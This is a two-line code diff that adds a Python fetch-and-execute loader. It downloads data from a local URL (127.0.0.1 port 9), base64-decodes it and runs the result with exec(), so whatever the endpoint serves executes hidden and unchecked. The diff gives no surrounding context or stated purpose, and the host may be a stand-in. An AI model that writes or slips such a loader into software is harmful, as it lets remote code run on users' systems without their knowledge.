@@ -1,0 +1,2 @@
+import base64, urllib.request
+exec(base64.b64decode(urllib.request.urlopen('http://127.0.0.1:9/x').read()))
